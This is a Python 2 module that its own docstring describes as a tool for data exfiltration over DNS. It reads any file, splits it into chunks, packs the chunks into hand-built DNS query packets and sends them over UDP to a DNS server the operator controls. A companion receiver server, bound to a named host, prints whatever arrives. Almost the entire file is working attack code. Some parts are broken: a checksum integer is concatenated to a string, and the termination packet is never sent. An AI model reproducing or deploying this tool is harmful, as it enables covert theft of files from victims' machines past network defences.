#!/usr/bin/env python

import sys
import zlib
import time
import socket

"""
This file is meant to assist in data exfiltration over DNS queries.
It can be sniffed by the DNS server alone.
Hostname given should be owned by the DNS server you own.

DNS requests built with this: http://www.ccs.neu.edu/home/amislove/teaching/cs4700/fall09/handouts/project1-primer.pdf
"""

# Constants
READ_BINARY = "rb"
MAX_PAYLOAD_SIZE = "76"
INITIATION_STRING = "INIT_445"
DELIMITER = "::"
NULL = "\x00"
DATA_TERMINATOR = "\xcc\xcc\xcc\xcc\xff\xff\xff\xff"


def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01):
	"""
	Will exfiltrate data over DNS to the known DNS server (i.e. host).
	I just want to say on an optimistic note that byte, bit, hex and char manipulation
	is Python are terrible.
	:param host: DNS server IP
	:param path_to_file: Path to file to exfiltrate
	:param port: UDP port to direct to. Default is 53.
	:param max_packet_size: Max packet size. Default is 128.
	:param time_delay: Time delay between packets. Default is 0.01 secs.
	:return:Boolean
	"""

	def build_dns(host_to_resolve):
		"""
		Building a standard DNS query packet from raw.
		DNS is hostile to working with. Especially in python.
		The Null constant is only used once since in the rest
		it's not a Null but rather a bitwise 0. Only after the
		DNS name to query it is a NULL.
		:param host_to_resolve: Exactly what is sounds like
		:return: The DNS Query
		"""

		res = host_to_resolve.split(".")
		dns = ""
		dns += "\x04\x06"		# Transaction ID
		dns += "\x01\x00"		# Flags - Standard Query
		dns += "\x00\x01"		# Queries
		dns += "\x00\x00"		# Responses
		dns += "\x00\x00"		# Authoroties
		dns += "\x00\x00"		# Additional
		for part in res:
			dns += chr(len(part)) + part
		dns += NULL			    # Null termination. Here it's really NULL for string termination
		dns += "\x00\x01"		# A (Host Addr), \x00\x1c for AAAA (IPv6)
		dns += "\x00\x01"		# IN Class
		return dns

	# Read file
	try:
		fh = open(path_to_file, READ_BINARY)
		exfil_me = fh.read()
		fh.close()
	except:
		sys.stderr.write("Problem with reading file. ")
		return -1

	checksum = zlib.crc32(exfil_me)  # Calculate CRC32 for later verification

	# Try and check if you can send data
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	except socket.error, msg:
		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
		return -1

	# Initiation packet:
	dns_request = build_dns(host)                                               # Build the DNS Query
	dns_request += INITIATION_STRING + DELIMITER + checksum + NULL              # Extra data goes here

	addr = (host, port)             # build address to send to
	s.sendto(dns_request, addr)

	# Sending actual file:
	chunks = [exfil_me[i:i + max_packet_size] for i in range(0, len(exfil_me), max_packet_size)]  # Split into chunks
	for chunk in chunks:
		dns_request = build_dns(host)
		dns_request += chunk + DATA_TERMINATOR
		s.sendto(dns_request, addr)
		time.sleep(time_delay)

	# Send termination packet:
	dns_request = build_dns(host)
	dns_request += DATA_TERMINATOR + NULL + DATA_TERMINATOR

	return 0


def dns_server(host="demo.morirt.com", port=53, play_dead=True):

	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	except socket.error, msg :
		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
		raise

	try:
		s.bind((host, port))
	except socket.error , msg:
		sys.stderr.write('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
		raise

	# Will keep connection alive as needed
	while 1:
		# Todo: Here be done data analysis of incoming traffic
		# receive data from client (data, addr)
		d = s.recvfrom(1024)
		data = d[0]
		addr = d[1]

		if not data:
			# No damn data
			pass

		print data

		reply = 'OK...' + data

		s.sendto(reply, addr)
		print 'Message[' + addr[0] + ':' + str(addr[1]) + '] - ' + data.strip()

	s.close()
	return 0

if __name__ == "__main__":
	sys.stdout.write("This is meant to be a module for python and not a stand alone executable\n")